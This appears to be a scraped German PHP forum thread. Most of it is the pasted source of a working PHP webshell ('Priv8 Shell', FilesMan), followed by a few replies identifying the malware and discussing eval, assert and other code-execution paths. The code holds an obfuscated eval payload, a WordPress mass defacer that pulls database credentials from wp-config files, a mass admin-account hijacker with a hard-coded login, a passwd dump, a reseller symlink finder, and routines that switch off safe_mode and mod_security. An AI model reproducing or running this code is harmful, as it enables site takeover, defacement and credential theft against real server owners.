c2jZP8/CXHlfs4R//aXPAzE2JkbGXl40Elc/dtqcK03xNiSmg4hy79I0ED2wVtCgFFZeqguQI2lZpC6yP2zR6lhjPiiTT5LrW4/crwC5hce6LRHkA82zsGZmTXB/GT+HutSJZL/C7PrPeE9yMUy3Fi2v/t99/0T3kQWDIuYb1+SJrBtP3rqIVYviyAE8ccup6/iYpcHO8Y5hTFmUk8nBmLBXUh9FJGvt2JoXDayou/X8yEH5HYdPvXN4+4uPafNndmhGT2WyPG2GlGHP94yWOxa0JUd93DEO4nAuG5Qeeeble4OMe7RrGczgq+gBS1fDOVEihoKtnCJoHXZQ/TH1mhkV0qSOdpOiKIJ3kk2ltt1knZyoRSdnY8m7jHBD5FFKPiJ3I4Gk/BeufU7Ae8UrnkRr/RjxmfqKSxXDUc10Fcru3jt3a+8opL9qhFc40va4aklyQYsZfPnVNG2YUEY4PkpI4tOpfOaghxv5IIOCl9uCIoOrKY68UhjJxu89UDFkSRWwe8cT5+nGEa7guowXE1LqnWf3NB7s7Htme9va2d3YhDZh/CmNcLSn2ABisLWXrevwoe3Aw/1/Rs063Lzn8SMtMDTgxxLhRMkyKIOVJI30Fae8I0DTNkKUeBQmP8PxYsMq5/HMd35BFoi6KdXFXFKpFow4cFGYeZWPLsYOSWv+z7TEyu8SAhQjxyWiaRCTHb8pGIiJBdE5PF8btI6Q29ZUq3ALdUeT+XNnk3rLuKD76o/XwEXhnRBQutlJ4uz0BH+b1ll2oPHhsLhXihn8bPoc6YFrAO3Kr/9ZpBVKHvyMzPDq9o9U+PnmTpLDanmHt00WwN/RkHnNZbzXXTUBilnbnYXWyGlBkq73cu0eTDR470sZ3NVKKVUkc8V7OycUQcLTrw==";
    eval(str_rot13(gzinflate(str_rot13(base64_decode(($hex))))));
    die;
}
if (isset($_REQUEST['title'])) {
echo"<html>
<head>
<style>
@import 'https://fonts.googleapis.com/css?family=Iceland';
html,body{
    background: black;
    padding: 0;
    direction: ltr;
    margin: 0;
}
h1{
    color:#16a085;
    text-shadow:0 0 5px;
    font-family: Iceland;
}
#gter{
    position: absolute;
    top: 0;
    width: 100%;
    text-align: center;
    background: black;
    color:#fff;
    padding-top: 10px;
    padding-bottom: 10px;
    font-family: Iceland;
    margin-bottom:20px;
}
#gter span{
    color:white;
    font-size: 18px;
    text-shadow: :0px 0px 15px #00ffff;
}
.f{
    color:white;
    font-family: Iceland;
    text-shadow: 0 0 15px #00ffff;
    font-size: 21px;
}
a{
    font-family: Iceland;
    text-decoration: none;
    color:white;
    text-shadow:0 0 15px #0095ff;
}
form{
    margin-top: 120px;
}
input[type=submit]{
    font-size:20px;
    height: 25px;
    width: 150px;
    border: 2px solid blue;
    color: white;
    background-color: black;
    font-family: Iceland;
}
input[type=submit]:hover{
    box-shadow: 0 0 2px #0095ff;
}
input[type=text]{
    font-family:Iceland;
    width: 400px;
    height: 25px;
    color: blue;
    background: #000000;
    border: 1px solid #0095ff;
    padding: 5px;
    text-align: center;
    font-size:20px;
}    
input[type=text]:focus{
    box-shadow: 0 0 3px #0095ff;
}
.heading{
    color:white;
    font-size:35px;
    margin-top: 20px;
    margin-bottom: -110px;
    font-family:Iceland;
    text-shadow:0px 0px 20px blue;    
}
</style>";

error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
if(version_compare(PHP_VERSION, '5.3.0', '<')){
    set_magic_quotes_runtime(0);
}
function GrabUrl($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
            if(preg_match("#$type#is", $lol)) {
                echo "$lol\r\n";
            }
        }
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
echo "<center><p class='heading'>Priv8 Shell Wp Mass Title Changer</p>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' size='50' placeholder='http://url.com/priv_sym404/'><br>
<input type='submit' style='width: 150px;' name='gass' value='Submit!!'>
</form></center>";
if($_POST['gass']) {
    echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'],'wordpress');    
echo"</textarea>

    <br><div data-role = 'fieldcontain' class = 'ui-hide-label' style='float:left'>
            <label for='name'>ID: </label>
            <input type='text' name='name' id='id' value='1'/>
        </div>
        <div data-role ='fieldcontain' class= 'ui-hide-label' style='float:left'>
            <label for='surname'> TITLE: </label>
            <input type='text' name='title' id='surname' value='Hacked By HEx' />
        </div>
                <div data-role ='fieldcontain' class= 'ui-hide-label' style='float:left'>
            <label for='surname'> POST CONTENT: </label>
            <input type='text' name='content' id='surname' value='Hacked by HEx | We Are Pakistani Hackers -,- Fuck You Admin' />
        </div>
        <div data-role ='fieldcontain' class= 'ui-hide-label' style='float:left'>
            <label for='surname'> POSTNAME: </label>
            <input type='text' name='postname' id='surname' value='Hacked by HEx' />
        </div> <br>

<input type='submit' style='width: 150px;' name='edittitle' value='Submit!!'>
</form></center>";
}
if($_POST['edittitle']) {
            $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
        function anucurl($sites) {
            $ch = curl_init($sites);
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                     curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                     curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                     curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                     curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=white>Error, I can't take the domain name</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=white>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=orange>Changed Succeed.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }    
    die;
}

if (isset($_REQUEST['user'])) {
echo"<html><head><title>Priv8 Shell Wp Mass User Changer</title></head>
<style>
@import 'https://fonts.googleapis.com/css?family=Iceland';
html,body{
    background: black;
    padding: 0;
    direction: ltr;
    margin: 0;
}
h1{
    color:#16a085;
    text-shadow:0 0 5px;
    font-family: Iceland;
}
#gter{
    position: absolute;
    top: 0;
    width: 100%;
    text-align: center;
    background: black;
    color:#fff;
    padding-top: 10px;
    padding-bottom: 10px;
    font-family: Iceland;
    margin-bottom:20px;
}
#gter span{
    color:white;
    font-size: 18px;
    text-shadow: :0px 0px 15px #00ffff;
}
.f{
    color:white;
    font-family: Iceland;
    text-shadow: 0 0 15px #00ffff;
    font-size: 21px;
}
a{
    font-family: Iceland;
    text-decoration: none;
    color:white;
    text-shadow:0 0 15px #0095ff;
}
form{
    margin-top: 120px;
}
input[type=submit]{
    font-size:20px;
    height: 25px;
    width: 150px;
    border: 2px solid blue;
    color: white;
    background-color: black;
    font-family: Iceland;
}
input[type=submit]:hover{
    box-shadow: 0 0 2px #0095ff;
}
input[type=text]{
    font-family:Iceland;
    width: 400px;
    height: 25px;
    color: blue;
    background: #000000;
    border: 1px solid #0095ff;
    padding: 5px;
    text-align: center;
    font-size:20px;
}    
input[type=text]:focus{
    box-shadow: 0 0 3px #0095ff;
}
.heading{
    color:white;
    font-size:35px;
    margin-top: 20px;
    margin-bottom: -110px;
    font-family:Iceland;
    text-shadow:0px 0px 20px blue;    
}
</style>
</head>
<body>
<center>
<center><p class='heading'>Priv8 Shell Wp Mass User Changer</p></center>
<br /><br />
<form method='post'>
<input type='text' name='config' placeholder='Config URL Here'>
<br><br>
<input type='submit' name='ch' value='Change Admin'>
</form>
</center>";

set_time_limit(0);
error_reporting(0);
if ($_POST['ch']) {
    $get2 = file_get_contents($_POST['config']);
    preg_match_all('#<a href="(.*?)"#', $get2, $config);
    foreach ($config[1] as $don) {
        $get = file_get_contents($_POST['config'] . "/" . $don);
        preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
        foreach ($host[1] as $don) {
            $host = $don;
        }
        preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
        foreach ($pass[1] as $done) {
            $password = $done;
        }
        preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
        foreach ($user[1] as $done1) {
            $user = $done1;
        }
        preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
        foreach ($name[1] as $done2) {
            $name = $done2;
        }
        preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
        foreach ($prefix[1] as $done3) {
            $prefix = $done3;
        }
        $connect = mysqli_connect($host, $user, $password, $name);
        if ($connect) {
            $query1 = mysqli_query($connect, "select * from " . $prefix . "options where option_name='siteurl'");
            while ($siteurl = mysqli_fetch_array($query1)) {
                $site_url = $siteurl['option_value'];
            }
            $query2 = mysqli_query($connect, "update " . $prefix . "users set user_login='pakarmy',user_pass='72e94a0c077a017a6bde7db0aeb514c2'");
            if ($query2) {
                echo "<center><span class=f>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url/wp-login.php</a><br><br>UserName : pakarmy<br><br>Password : Pakarmy@0882<br><br></span></center>";
            }
        }
    }
}
 echo"</body></html>";

    die;
}

if (isset($_REQUEST['reseller'])) {
echo"<html>  <head> <meta http-equiv='Content-Language' content='fr'> <meta http-equiv='Content-Type' content='text/html; charset=windows-1252'> <title>Priv8 Shell - WHM Resellers Finder</title> <meta name='keywords' content='WHM Resellers Finders ~Sajjad 1337 :: Rizi_haoxr :: Team '> <meta name='description' content='WHM Resellers Finder - coded by: ~Rizi_haxor'> </head>  <body bgcolor='#000000' style='text-align: center'> <p><font size='6' color='#0095ff'>Priv8 Shell WHM & Resellers Finder</font></p>  <center> <table border='1' width='50%' cellspacing='0' cellpadding='15' style='border-width: 0px'>         <tr>             <td background='http://buyshellsites.com/bg.gif' style='border-style: none; border-width: medium'> <div align='center'>     <table border='1' width='100%' bgcolor='#000000' cellpadding='0' style='border-collapse: collapse' bordercolor='#333333'>     <tr>                  <td width='100' align='center'>         <font face='Courier New' size='2' color='#0095ff'>Reseller</font></td>         <td width='100' align='center'>         <font face='Courier New' size='2' color='#0095ff'>Accounts</font></td>         <td width='100' align='center'>         <font face='Courier New' size='2' color='#0095ff'>Symlink</font></td>              </tr> </table>   <BR>";



## grabs resellerss file
$lines = file("/etc/trueuserowners");


## split pure resellers's names
for ($i = 0; $i < count($lines); $i++) {
$values2 = split(': ', $lines[$i]);
$resellers[$i] = $values2['1'];
}

## remove duplicated resellerss and empty values
$resellers = array_unique($resellers);
$resellers = array_filter($resellers);

foreach($resellers as $reseller){
    $count = 0;
for ($i = 0; $i < count($lines); $i++) {

    if (strpos($lines[$i], ": $reseller") ) {
    $count = $count+1;
}

}

print '<table border="1" width="100%" bgcolor="#333333" cellpadding="0" style="border-collapse: collapse" bordercolor="#000000">
    <tr>

        <td width="100" align="center">
        <font face="Courier New" size="2" color="#0095ff">'.$reseller.'</font></td>
        <td width="100" align="center">
        <font face="Courier New" size="2" color="#0095ff">'.$count.'</font></td>
        <td width="100" align="center">
        <a href="./sym1/root/home/'.$reseller.'/public_html/" target="_blank"><font face="Courier New" size="2" color="#0095ff">Symlink</font></td>

    </tr>
</table>



<BR></table> </center> </body>  </html>';
}


    die;
}

if (isset($_REQUEST['passwd'])) {
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
 echo '<center>';
        echo "<textarea class='inputz' cols='90' rows='20'>";
        for ($uid = 0;$uid < 60000;$uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    print "$val:";
                }
                print "
";
            }
        }
        echo "</textarea><br><br>";

    die;
}
if (isset($_REQUEST['disabled'])) {
echo "<html>

<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<center><b><font color='white' size='4'>[SafeMode Done]</font></center>";
echo ("");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
KillFilterEngine Off
KillFilterScanPOST Off
KillFilterCheckURLEncoding Off
KillFilterCheckUnicodeEncoding Off
</IfModule>
");


echo "<center><b> <font color='white' size='4'>[Mod_Security Done]</font></center>";
    die;
}
// xd
if( empty($_POST['a']) )
    if(isset($▚) && function_exists('action' . $▚))
        $_POST['a'] = $▚;
    else
        $_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
    call_user_func('action' . $_POST['a']);
?>
Competence-Center -> Enjoy the Informatrix
PHProcks! • Einsteiger freundliche Tutorials • PreComposed Packages
1 Likes
 Zeichen32 
Zeichen32
Dabei seit: 11.08.2011 Beiträge: 1565
#7
10.11.2021, 16:41
Das sieht dann ja nach diesem Exploid aus:
FilesMan (malware.expert)
 drsoong 
drsoong
Dabei seit: 05.08.2008 Beiträge: 2710
#8
10.11.2021, 17:06
Holy Fuck, was ist das denn alles?

Sieht nach einer umfangreichen Hacker-Suite aus. Inkl. File Upload, Aufspüren von andere Files etc., was, wie ich gerade sehe, auch so ungefähr zu lesen ist, wenn man dem Link von Zeichen32 folgt.

arne Drews: Vielen Dank, dass Du Dir die Mühe gemacht hast. Hier sieht man, dass Obfuscation schon entnervend sein kann...


Am besten man deaktiviert eval, oder?1
[B]Es ist schon alles gesagt. Nur noch nicht von allen.[/B]
 hellbringer 
hellbringer
Moderator
Dabei seit: 09.08.2015 Beiträge: 11333
#9
10.11.2021, 17:10
Besser man sorgt dafür, dass niemand fremden PHP-Code einschleust. Denn man kann auch ohne eval() bösen Code ausführen.
 erc 
erc
Dabei seit: 02.01.2009 Beiträge: 4380
#10
10.11.2021, 19:34
Zitat von drsoong Beitrag anzeigen
Am besten man deaktiviert eval, oder?1
Das ist ein Tropfen auf dem heißen Stein. Nicht jede Shell verwendet eval als obsfucation, das kann auch ein preg_match mit e modifier sein, das kann ein assert sein, das kann auch plain PHP sein, oder weiß der Geier was. Jemanden der wirklich "intresse" an deinem System hat, hällst du damit nicht auf. Das Grundlegende Problem ist hier schon, das der Angreifer eine Datei mit beliebigen Inhalt erzeugen konnte und die auch noch ausführen kann. Das damit eine Shell platziert wird ist nur convenience. Du kannst das etwas entschärfen wenn du den PHP User nur nötige Schreibrechte gibts. Je nachdem was das für eine Sicherheitslücke ist, bringt das unter Umständen aber auch nix.

PS: falls jemand intresse hat... https://github.com/tennc/webshell da gibts solche Shells in 100terten Sprachen und Geschmacksrichtungen.
 drsoong 
drsoong
Dabei seit: 05.08.2008 Beiträge: 2710
#11
11.11.2021, 09:04
Wenn ich nochmal darüber nachdenke, könnte man ja als Hacker die Obfuscation auch weg lassen und einfach den PHP Code "normal" eintippen. Ausschlaggebend ist ja, dass die Datei überhaupt auf dem Server landet.

@hellbringer: Da habe ich Unbedarfter mich wohl verwirren lassen. 

Dennoch, wenn der Code verschleiert wird, nur um zukünftig etwas fachmännischer auftreten zu können, würde mich ja mal interessieren, was es da noch für Möglichkeiten gibt, Code auszuführen.

preg_match mit e modifier
Hierzu habe ich hier nichts gefunden. https://www.php.net/manual/en/refere....modifiers.php

Ist das ein abgeschaffter Modifier?

das kann ein assert sein
Habe ich verstanden:
Wird der Parameter assertion als Zeichenkette übergeben, so wird die Zeichenkette von assert() als PHP-Code interpretiert.
Und sonst?

[B]Es ist schon alles gesagt. Nur noch nicht von allen.[/B]
 tk1234 
tk1234
Dabei seit: 30.12.2014 Beiträge: 2245
#12
11.11.2021, 10:07
Zitat von drsoong Beitrag anzeigen
Ist das ein abgeschaffter Modifier?
Ja, der e-Modifier für preg_replace (nur dort gab es ihn) wurde mit PHP 7.0.0 entfernt.
 hellbringer 
hellbringer
Moderator
Dabei seit: 09.08.2015 Beiträge: 11333
#13
11.11.2021, 10:48
Zuletzt geändert von hellbringer; 11.11.2021, 10:53.
Zitat von drsoong Beitrag anzeigen
Dennoch, wenn der Code verschleiert wird, nur um zukünftig etwas fachmännischer auftreten zu können, würde mich ja mal interessieren, was es da noch für Möglichkeiten gibt, Code auszuführen.
include, require, exec, passthru, shell_exec, system, `` (Backticks), proc_open, () (Klammern hinter einem String hinzufügen), usw.

Die Seite wurde um 05:43 erstellt.
